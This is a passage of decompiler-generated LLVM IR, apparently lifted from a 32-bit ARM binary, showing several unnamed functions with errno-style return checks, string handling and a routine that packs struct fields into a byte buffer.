  br i1 %v2_1ca2c, label %dec_label_pc_1ca44, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1ca28
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1c91c, align 4
  br label %dec_label_pc_1cb90

dec_label_pc_1ca44:                               ; preds = %dec_label_pc_1ca28
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_1ca50 = load i32, i32* @sl, align 4
  store i32 %v0_1ca50, i32* %r0.global-to-local, align 4
  %v2_1ca58 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1ca58, i32* %r2.global-to-local, align 4
  %v2_1ca5c = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1ca5c, i32* %r3.global-to-local, align 4
  %v7_1ca68 = inttoptr i32 %v0_1ca50 to i8*
  %v8_1ca68 = call i32 @function_1bad4(i8* %v7_1ca68, i32 1, i32 %v2_1ca58, i32 %v2_1ca5c)
  store i32 %v8_1ca68, i32* %r0.global-to-local, align 4
  %v1_1ca6c = icmp slt i32 %v8_1ca68, 0
  br i1 %v1_1ca6c, label %.thread, label %dec_label_pc_1ca84

.thread:                                          ; preds = %dec_label_pc_1ca44
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1c91c, align 4
  br label %dec_label_pc_1cb90

dec_label_pc_1ca84:                               ; preds = %dec_label_pc_1ca44
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_1ca88 = icmp eq i32 %tmp12, 1
  br i1 %v7_1ca88, label %dec_label_pc_1ca90, label %dec_label_pc_1cb68

dec_label_pc_1ca90:                               ; preds = %dec_label_pc_1ca84
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_1caa8 = load i32, i32* @r5, align 4
  %v2_1caa8 = add i32 %v0_1caa8, -12
  store i32 %v2_1caa8, i32* @r8, align 4
  %v8_1caa8 = icmp slt i32 %v2_1caa8, 0
  br i1 %v8_1caa8, label %bb37, label %dec_label_pc_1cab4

bb37:                                             ; preds = %dec_label_pc_1ca90
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1cb78

dec_label_pc_1cab4:                               ; preds = %dec_label_pc_1ca90
  %v0_1cab4 = load i32, i32* @r6, align 4
  store i32 %v0_1cab4, i32* @r1, align 4
  %v2_1cab8 = add i32 %v0_1cab4, 12
  store i32 %v2_1cab8, i32* @r0, align 4
  %v2_1cabc = call i32 @function_1cd10(i32 %v2_1cab8, i32 %v0_1cab4)
  %v0_1cac0 = load i32, i32* @fp, align 4
  %v1_1cac0 = add i32 %v0_1cac0, 4
  store i32 %v1_1cac0, i32* @r3, align 4
  %v1_1cac4 = load i32, i32* @r4, align 4
  %v2_1cac4 = add i32 %v1_1cac4, %v1_1cac0
  store i32 %v2_1cac4, i32* @r5, align 4
  store i32 %v2_1cac4, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_1cad4 = call i32 @function_14000()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1cae0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1cae0

dec_label_pc_1cae0:                               ; preds = %dec_label_pc_1cae0, %dec_label_pc_1cab4
  %v0_1cae0 = phi i32 [ %v0_1cae0.pre, %dec_label_pc_1cab4 ], [ %v1_1cae4, %dec_label_pc_1cae0 ]
  %v1_1cae0 = load i32, i32* @r6, align 4
  %v7_1cae0 = inttoptr i32 %v1_1cae0 to i32*
  store i32 %v0_1cae0, i32* %v7_1cae0, align 4
  %v0_1cae4 = load i32, i32* @r5, align 4
  %v1_1cae4 = add i32 %v0_1cae4, 4
  store i32 %v1_1cae4, i32* @r5, align 4
  %v0_1cae8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1cae8 = add i32 %v0_1cae8, 1
  store i32 %v1_1cae8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_1cae8, 0
  br i1 %tmp38, label %dec_label_pc_1cae0, label %dec_label_pc_1caf8

dec_label_pc_1caf8:                               ; preds = %dec_label_pc_1cae0
  %v3_1caf8 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1caf8, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1cb00 = icmp eq i32 %v3_1caf8, 0
  %v1_1cb04 = load i32, i32* @r6, align 4
  %v5_1cb04 = mul i32 %v1_1cae8, 4
  %v6_1cb04 = add i32 %v1_1cb04, %v5_1cb04
  %v7_1cb04 = inttoptr i32 %v6_1cb04 to i32*
  store i32 0, i32* %v7_1cb04, align 4
  br i1 %v2_1cb00, label %dec_label_pc_1cb34, label %dec_label_pc_1cb0c

dec_label_pc_1cb0c:                               ; preds = %dec_label_pc_1caf8
  %v0_1cb0c = load i32, i32* @r4, align 4
  store i32 %v0_1cb0c, i32* @r0, align 4
  %v0_1cb10 = call i32 @function_13f70()
  store i32 %v0_1cb10, i32* %r0.global-to-local, align 4
  %v0_1cb14 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1cb14, %v0_1cb10
  br i1 %tmp, label %dec_label_pc_1cb1c, label %dec_label_pc_1cb34

dec_label_pc_1cb1c:                               ; preds = %dec_label_pc_1cb0c
  %v0_1cb1c = load i32, i32* @r4, align 4
  store i32 %v0_1cb1c, i32* @r1, align 4
  %v0_1cb20 = load i32, i32* @r5, align 4
  store i32 %v0_1cb20, i32* %r0.global-to-local, align 4
  %v2_1cb24 = inttoptr i32 %v0_1cb20 to i8*
  %v3_1cb24 = call i32 @function_14210(i8* %v2_1cb24, i32 %v0_1cb1c)
  store i32 %v3_1cb24, i32* %r0.global-to-local, align 4
  %v0_1cb28 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1cb34

dec_label_pc_1cb34:                               ; preds = %dec_label_pc_1cb0c, %dec_label_pc_1caf8, %dec_label_pc_1cb1c
  %storemerge1 = phi i32 [ %v0_1cb28, %dec_label_pc_1cb1c ], [ %v0_1c8b0, %dec_label_pc_1cb0c ], [ %v0_1c8b0, %dec_label_pc_1caf8 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1cb38 = load i32, i32* @r7, align 4
  %v2_1cb38 = add i32 %v1_1cb38, 8
  %v3_1cb38 = inttoptr i32 %v2_1cb38 to i32*
  store i32 2, i32* %v3_1cb38, align 4
  %v0_1cb3c = load i32, i32* %r2.global-to-local, align 4
  %v2_1cb3c = mul i32 %v0_1cb3c, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1cb44 = load i32, i32* @r7, align 4
  %v2_1cb44 = add i32 %v1_1cb44, 12
  %v3_1cb44 = inttoptr i32 %v2_1cb44 to i32*
  store i32 %v2_1cb3c, i32* %v3_1cb44, align 4
  %v3_1cb48 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1cb48, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_1cb50 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1cb50, i32* @r5, align 4
  %v0_1cb54 = load i32, i32* @r7, align 4
  %v2_1cb54 = inttoptr i32 %v3_1cb48 to i32*
  store i32 %v0_1cb54, i32* %v2_1cb54, align 4
  %v0_1cb58 = load i32, i32* @r7, align 4
  %v1_1cb58 = inttoptr i32 %v0_1cb58 to i32*
  %v2_1cb58 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1cb58, i32* %v1_1cb58, align 4
  %v3_1cb58 = add i32 %v0_1cb58, 4
  %v4_1cb58 = inttoptr i32 %v3_1cb58 to i32*
  %v5_1cb58 = load i32, i32* @fp, align 4
  store i32 %v5_1cb58, i32* %v4_1cb58, align 4
  %v0_1cb5c = load i32, i32* @r6, align 4
  %v1_1cb5c = load i32, i32* @r7, align 4
  %v2_1cb5c = add i32 %v1_1cb5c, 16
  %v3_1cb5c = inttoptr i32 %v2_1cb5c to i32*
  store i32 %v0_1cb5c, i32* %v3_1cb5c, align 4
  %v0_1cb60 = load i32, i32* %r3.global-to-local, align 4
  %v1_1cb60 = load i32, i32* %r2.global-to-local, align 4
  %v2_1cb60 = inttoptr i32 %v1_1cb60 to i32*
  store i32 %v0_1cb60, i32* %v2_1cb60, align 4
  br label %dec_label_pc_1cb78

dec_label_pc_1cb68:                               ; preds = %dec_label_pc_1ca84
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_1c91c, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1cb78

dec_label_pc_1cb78:                               ; preds = %bb37, %dec_label_pc_1cb34, %dec_label_pc_1cb68
  %v3_1cb78 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1cb78, i32* @r0, align 4
  %v0_1cb7c = call i32 @function_15850()
  %v3_1cb80 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1cb80, i32* @r0, align 4
  %v0_1cb84 = call i32 @function_15850()
  store i32 %v0_1cb84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cb90

dec_label_pc_1cb8c:                               ; preds = %dec_label_pc_1c964, %dec_label_pc_1c988
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1cb90

dec_label_pc_1cb90:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1c950, %dec_label_pc_1c930, %dec_label_pc_1cb78, %dec_label_pc_1c9ec, %dec_label_pc_1cb8c
  %v0_1cb90 = load i32, i32* @r5, align 4
  store i32 %v0_1cb90, i32* %r0.global-to-local, align 4
  ret i32 %v0_1cb90

; uselistorder directives
  uselistorder i32 %v1_1cae8, { 1, 0, 2 }
  uselistorder i32 %v1_1cae4, { 1, 0 }
  uselistorder i32 %v0_1cab4, { 1, 0, 2 }
  uselistorder i32 %v2_1caa8, { 1, 0 }
  uselistorder i32 %v1_1c9a8, { 2, 1, 0 }
  uselistorder i32 %v1_1c99c, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_1c91c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1c8bc, { 1, 0 }
  uselistorder i32 %v0_1c8b0, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 17, 18, 4, 3, 5, 7, 6, 0, 9, 8, 11, 10, 12, 13, 15, 14, 16 }
  uselistorder i32 ()* @function_15850, { 21, 20, 19, 18, 17, 16, 10, 9, 8, 7, 6, 15, 14, 13, 12, 5, 4, 3, 2, 11, 22, 29, 28, 27, 1, 26, 25, 24, 23, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_1c85c, { 1, 0 }
  uselistorder label %dec_label_pc_1cb90, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_1cb8c, { 1, 0 }
  uselistorder label %dec_label_pc_1cb78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cb34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c964, { 2, 0, 1 }
}

define i32 @function_1cba0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_1cba0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1cba0 = load i32, i32* @r7, align 4
  store i32 %v3_1cba0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1cbc8, label %dec_label_pc_1cbb8

dec_label_pc_1cbb8:                               ; preds = %dec_label_pc_1cba0
  %v0_1cbb8 = call i32 @function_12b24()
  %v0_1cbbc = load i32, i32* %r7.global-to-local, align 4
  %v1_1cbbc = sub i32 0, %v0_1cbbc
  %v2_1cbc0 = inttoptr i32 %v0_1cbb8 to i32*
  store i32 %v1_1cbbc, i32* %v2_1cbc0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1cbcc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1cbc8

dec_label_pc_1cbc8:                               ; preds = %dec_label_pc_1cba0, %dec_label_pc_1cbb8
  %v2_1cbcc = phi i32 [ %v3_1cba0, %dec_label_pc_1cba0 ], [ %v2_1cbcc.pre, %dec_label_pc_1cbb8 ]
  %v0_1cbc8 = phi i32 [ %arg1, %dec_label_pc_1cba0 ], [ -1, %dec_label_pc_1cbb8 ]
  store i32 %v2_1cbcc, i32* @r7, align 4
  ret i32 %v0_1cbc8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1cbc8, { 1, 0 }
}

define i32 @function_1cbd4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1cbd4:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_1cbe0 = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1cbf0 = call i32 @function_1d188(i32 %v2_1cbe0)
  %v7_1cbf4 = icmp eq i32 %v1_1cbf0, -1
  br i1 %v7_1cbf4, label %bb, label %dec_label_pc_1cc00

bb:                                               ; preds = %dec_label_pc_1cbd4
  store i32 %v1_1cbf0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cc3c

dec_label_pc_1cc00:                               ; preds = %dec_label_pc_1cbd4
  %v2_1cc00 = ptrtoint i32* %stack_var_-341 to i32
  store i32 %v2_1cc00, i32* @r0, align 4
  %v0_1cc08 = call i32 @function_13f70()
  %v1_1cc0c = add i32 %v0_1cc08, 1
  %v1_1cc10 = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1cc0c, %v1_1cc10
  br i1 %tmp, label %dec_label_pc_1cc18, label %dec_label_pc_1cc2c

dec_label_pc_1cc18:                               ; preds = %dec_label_pc_1cc00
  %v0_1cc18 = call i32 @function_12b24()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1cc24 = inttoptr i32 %v0_1cc18 to i32*
  store i32 22, i32* %v2_1cc24, align 4
  %v0_1cc3c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cc3c

dec_label_pc_1cc2c:                               ; preds = %dec_label_pc_1cc00
  %v0_1cc2c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_1cc00, i32* @r1, align 4
  %v2_1cc34 = inttoptr i32 %v0_1cc2c to i8*
  %v3_1cc34 = call i32 @function_14210(i8* %v2_1cc34, i32 %v2_1cc00)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cc3c

dec_label_pc_1cc3c:                               ; preds = %bb, %dec_label_pc_1cc18, %dec_label_pc_1cc2c
  %v0_1cc3c = phi i32 [ %v1_1cbf0, %bb ], [ %v0_1cc3c.pre, %dec_label_pc_1cc18 ], [ 0, %dec_label_pc_1cc2c ]
  ret i32 %v0_1cc3c

; uselistorder directives
  uselistorder i32 %v2_1cc00, { 1, 0, 2 }
  uselistorder i32 %v1_1cbf0, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @function_14210, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9 }
  uselistorder i32 22, { 2, 15, 3, 4, 17, 0, 16, 5, 6, 7, 8, 13, 9, 10, 11, 18, 12, 1, 14 }
  uselistorder label %dec_label_pc_1cc3c, { 2, 1, 0 }
}

define i32 @function_1cc4c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1cc4c:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1cc84, label %dec_label_pc_1cc70

dec_label_pc_1cc70:                               ; preds = %dec_label_pc_1cc4c
  %v0_1cc70 = call i32 @function_12b24()
  %v0_1cc74 = load i32, i32* %r7.global-to-local, align 4
  %v1_1cc74 = sub i32 0, %v0_1cc74
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1cc7c = inttoptr i32 %v0_1cc70 to i32*
  store i32 %v1_1cc74, i32* %v2_1cc7c, align 4
  br label %dec_label_pc_1cc94

dec_label_pc_1cc84:                               ; preds = %dec_label_pc_1cc4c
  %v2_1cc84 = icmp eq i32 %arg1, 0
  br i1 %v2_1cc84, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1cc84
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1cc84, %bb
  call void @__pseudo_cond_branch(i1 %v2_1cc84, i32 ptrtoint (i32* @global_var_1ad58.1150 to i32))
  br label %dec_label_pc_1cc94

dec_label_pc_1cc94:                               ; preds = %dec_label_pc_1cc70, %.thread
  %v0_1cc94 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1cc94

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1cc94, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1cca4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1cca4:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1cce4, label %dec_label_pc_1ccd0

dec_label_pc_1ccd0:                               ; preds = %dec_label_pc_1cca4
  %v0_1ccd0 = call i32 @function_12b24()
  %v0_1ccd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ccd4 = sub i32 0, %v0_1ccd4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1ccdc = inttoptr i32 %v0_1ccd0 to i32*
  store i32 %v1_1ccd4, i32* %v2_1ccdc, align 4
  %v0_1ccec.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ccec

dec_label_pc_1cce4:                               ; preds = %dec_label_pc_1cca4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1cce4 = icmp eq i32 %arg1, 0
  br i1 %v2_1cce4, label %dec_label_pc_1ccf8, label %dec_label_pc_1ccec

dec_label_pc_1ccec:                               ; preds = %dec_label_pc_1cce4, %dec_label_pc_1ccd0
  %v0_1ccec = phi i32 [ %arg1, %dec_label_pc_1cce4 ], [ %v0_1ccec.pre, %dec_label_pc_1ccd0 ]
  br label %dec_label_pc_1ccfc

dec_label_pc_1ccf8:                               ; preds = %dec_label_pc_1cce4
  br label %dec_label_pc_1ccfc

dec_label_pc_1ccfc:                               ; preds = %dec_label_pc_1ccec, %dec_label_pc_1ccf8
  %v1_1cd04 = phi i32 [ %v0_1ccec, %dec_label_pc_1ccec ], [ %tmp8, %dec_label_pc_1ccf8 ]
  ret i32 %v1_1cd04

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1ccfc, { 1, 0 }
}

define i32 @function_1cd08(i32 %arg1) local_unnamed_addr {
dec_label_pc_1cd08:
  ret i32 %arg1
}

define i32 @function_1cd10(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1cd10:
  %v0_1cd10 = load i32, i32* @r0, align 4
  %v1_1cd10 = load i32, i32* @r1, align 4
  %v2_1cd10 = inttoptr i32 %v0_1cd10 to i8*
  %v3_1cd10 = call i32 @function_198c0(i8* %v2_1cd10, i32 %v1_1cd10)
  ret i32 %v3_1cd10

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_198c0, { 1, 2, 0 }
}

define i32 @function_1cd20(i32 %arg1) local_unnamed_addr {
dec_label_pc_1cd20:
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1cd20 = load i32, i32* @r4, align 4
  store i32 %v3_1cd20, i32* %stack_var_-16, align 4
  %v9_1cd20 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r6, align 4
  %v0_1cd28 = call i32 @function_13f70()
  %v1_1cd2c = add i32 %v0_1cd28, 1
  store i32 %v1_1cd2c, i32* @r4, align 4
  %v1_1cd34 = call i32 @function_14ccc(i32 %v1_1cd2c)
  store i32 %v1_1cd34, i32* %r5.global-to-local, align 4
  %v2_1cd38 = icmp eq i32 %v1_1cd34, 0
  br i1 %v2_1cd38, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_1cd20
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1cd20, %bb
  %v1_1cd44 = xor i1 %v2_1cd38, true
  call void @__pseudo_cond_branch(i1 %v1_1cd44, i32 ptrtoint (i32* @global_var_14000.915 to i32))
  %v0_1cd48 = load i32, i32* %r5.global-to-local, align 4
  %v2_1cd4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1cd4c, i32* @r4, align 4
  store i32 %v9_1cd20, i32* @r6, align 4
  ret i32 %v0_1cd48

; uselistorder directives
  uselistorder i32 (i32)* @function_14ccc, { 12, 11, 10, 4, 3, 9, 8, 7, 13, 6, 5, 14, 20, 1, 19, 18, 17, 16, 15, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1cd54(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1cd54:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_1cd58 = load i32, i32* @lr, align 4
  store i32 %v0_1cd58, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_1cd64 = icmp sgt i32 %arg3, 11
  br i1 %v7_1cd64, label %dec_label_pc_1cd6c, label %dec_label_pc_1ce38

dec_label_pc_1cd6c:                               ; preds = %dec_label_pc_1cd54
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_1cd6c = add i32 %tmp, 1
  %v2_1cd6c = inttoptr i32 %v1_1cd6c to i8*
  %v3_1cd6c = load i8, i8* %v2_1cd6c, align 1
  store i8 %v3_1cd6c, i8* %tmp16, align 1
  %v0_1cd74 = load i32, i32* %ip.global-to-local, align 4
  %v1_1cd74 = inttoptr i32 %v0_1cd74 to i32*
  %v2_1cd74 = load i32, i32* %v1_1cd74, align 4
  %v1_1cd78 = trunc i32 %v2_1cd74 to i8
  %v4_1cd78 = add i32 %arg2, 1
  %v5_1cd78 = inttoptr i32 %v4_1cd78 to i8*
  store i8 %v1_1cd78, i8* %v5_1cd78, align 1
  %v0_1cd7c = load i32, i32* %ip.global-to-local, align 4
  %v1_1cd7c = add i32 %v0_1cd7c, 8
  %v2_1cd7c = inttoptr i32 %v1_1cd7c to i32*
  %v3_1cd7c = load i32, i32* %v2_1cd7c, align 4
  %v1_1cd80 = add i32 %v0_1cd7c, 20
  %v2_1cd80 = inttoptr i32 %v1_1cd80 to i32*
  %v3_1cd80 = load i32, i32* %v2_1cd80, align 4
  %v1_1cd84 = add i32 %v0_1cd7c, 4
  %v2_1cd84 = inttoptr i32 %v1_1cd84 to i32*
  %v3_1cd84 = load i32, i32* %v2_1cd84, align 4
  %v1_1cd88 = add i32 %v0_1cd7c, 12
  %v2_1cd88 = inttoptr i32 %v1_1cd88 to i32*
  %v3_1cd88 = load i32, i32* %v2_1cd88, align 4
  %v2_1cd8c = icmp eq i32 %v3_1cd80, 0
  br i1 %v2_1cd8c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1cd6c
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1cd6c, %bb
  %v0_1cd9c = phi i32 [ 0, %dec_label_pc_1cd6c ], [ 1, %bb ]
  %v1_1cd94 = urem i32 %v3_1cd7c, 16
  %v2_1cd98 = icmp eq i32 %v3_1cd84, 0
  %v4_1cd9c = mul nuw nsw i32 %v1_1cd94, 8
  %v5_1cd9c = or i32 %v0_1cd9c, %v4_1cd9c
  %v1_1cda0 = add i32 %v0_1cd7c, 16
  %v2_1cda0 = inttoptr i32 %v1_1cda0 to i32*
  %v3_1cda0 = load i32, i32* %v2_1cda0, align 4
  %. = select i1 %v2_1cd98, i32 0, i32 128
  %v2_1cdac = icmp eq i32 %v3_1cd88, 0
  %storemerge11 = select i1 %v2_1cdac, i32 0, i32 4
  %v2_1cdb8 = or i32 %v5_1cd9c, %.
  %v2_1cdbc = icmp eq i32 %v3_1cda0, 0
  %.26 = select i1 %v2_1cdbc, i32 0, i32 2
  %v2_1cdc8 = or i32 %v2_1cdb8, %storemerge11
  %v2_1cdcc = or i32 %v2_1cdc8, %.26
  %v1_1cdd0 = trunc i32 %v2_1cdcc to i8
  %v2_1cdd0 = load i32, i32* %lr.global-to-local, align 4
  %v3_1cdd0 = add i32 %v2_1cdd0, 2
  %v4_1cdd0 = inttoptr i32 %v3_1cdd0 to i8*
  store i8 %v1_1cdd0, i8* %v4_1cdd0, align 1
  %v0_1cdd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1cdd4 = add i32 %v0_1cdd4, 24
  %v1_1cdd8 = inttoptr i32 %v1_1cdd4 to i32*
  %v2_1cdd8 = load i32, i32* %v1_1cdd8, align 4
  %v3_1cdd8 = add i32 %v0_1cdd4, 28
  %v4_1cdd8 = inttoptr i32 %v3_1cdd8 to i32*
  %v5_1cdd8 = load i32, i32* %v4_1cdd8, align 4
  %v2_1cddc = icmp eq i32 %v2_1cdd8, 0
  %v1_1cde0 = urem i32 %v5_1cdd8, 16
  %v0_1cdec = select i1 %v2_1cddc, i32 0, i32 128
  %v2_1cdec = or i32 %v1_1cde0, %v0_1cdec
  %v1_1cdf0 = trunc i32 %v2_1cdec to i8
  %v2_1cdf0 = load i32, i32* %lr.global-to-local, align 4
  %v3_1cdf0 = add i32 %v2_1cdf0, 3
  %v4_1cdf0 = inttoptr i32 %v3_1cdf0 to i8*
  store i8 %v1_1cdf0, i8* %v4_1cdf0, align 1
  %v0_1cdf4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1cdf4 = add i32 %v0_1cdf4, 33
  %v2_1cdf4 = inttoptr i32 %v1_1cdf4 to i8*
  %v3_1cdf4 = load i8, i8* %v2_1cdf4, align 1
  %v2_1cdf8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1cdf8 = add i32 %v2_1cdf8, 4
  %v4_1cdf8 = inttoptr i32 %v3_1cdf8 to i8*
  store i8 %v3_1cdf4, i8* %v4_1cdf8, align 1
  %v0_1cdfc = load i32, i32* %ip.global-to-local, align 4
  %v1_1cdfc = add i32 %v0_1cdfc, 32
  %v2_1cdfc = inttoptr i32 %v1_1cdfc to i32*
  %v3_1cdfc = load i32, i32* %v2_1cdfc, align 4
  %v1_1ce00 = trunc i32 %v3_1cdfc to i8
  %v2_1ce00 = load i32, i32* %lr.global-to-local, align 4
  %v3_1ce00 = add i32 %v2_1ce00, 5
  %v4_1ce00 = inttoptr i32 %v3_1ce00 to i8*
  store i8 %v1_1ce00, i8* %v4_1ce00, align 1
  %v0_1ce04 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ce04 = add i32 %v0_1ce04, 37
  %v2_1ce04 = inttoptr i32 %v1_1ce04 to i8*
  %v3_1ce04 = load i8, i8* %v2_1ce04, align 1
  %v2_1ce08 = load i32, i32* %lr.global-to-local, align 4
  %v3_1ce08 = add i32 %v2_1ce08, 6
  %v4_1ce08 = inttoptr i32 %v3_1ce08 to i8*
  store i8 %v3_1ce04, i8* %v4_1ce08, align 1
  %v0_1ce0c = load i32, i32* %ip.global-to-local, align 4
  %v1_1ce0c = add i32 %v0_1ce0c, 36
  %v2_1ce0c = inttoptr i32 %v1_1ce0c to i32*
  %v3_1ce0c = load i32, i32* %v2_1ce0c, align 4
  %v1_1ce10 = trunc i32 %v3_1ce0c to i8
  %v2_1ce10 = load i32, i32* %lr.global-to-local, align 4
  %v3_1ce10 = add i32 %v2_1ce10, 7
  %v4_1ce10 = inttoptr i32 %v3_1ce10 to i8*
  store i8 %v1_1ce10, i8* %v4_1ce10, align 1
  %v0_1ce14 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ce14 = add i32 %v0_1ce14, 41
  %v2_1ce14 = inttoptr i32 %v1_1ce14 to i8*
  %v3_1ce14 = load i8, i8* %v2_1ce14, align 1
  %v2_1ce18 = load i32, i32* %lr.global-to-local, align 4
  %v3_1ce18 = add i32 %v2_1ce18, 8
  %v4_1ce18 = inttoptr i32 %v3_1ce18 to i8*
  store i8 %v3_1ce14, i8* %v4_1ce18, align 1
  %v0_1ce1c = load i32, i32* %ip.global-to-local, align 4
  %v1_1ce1c = add i32 %v0_1ce1c, 40
